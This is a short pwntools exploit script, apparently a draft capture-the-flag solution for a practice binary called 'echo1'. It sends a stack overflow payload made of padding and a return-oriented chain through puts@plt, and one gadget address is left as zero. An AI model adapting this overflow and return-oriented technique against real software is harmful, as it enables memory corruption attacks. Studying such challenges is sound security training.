from pwn import *
pop_rdi_ret = 0
s = 0x400b80
puts_plt = 0x400630
echo1 = 0x400818


p = process("./echo1")
p.sendline("name")
p.recvuntil(">")
p.sendline("1")
payload  = ''
payload += 'a'*0x18
payload += 'b'*0x8
payload += 'b'*0x8
payload += p64( puts_plt )
payload += p64( s )
payload += p64( puts_plt )
payload += p64( echo1 )
raw_input()
p.sendline(payload)

p.interactive()
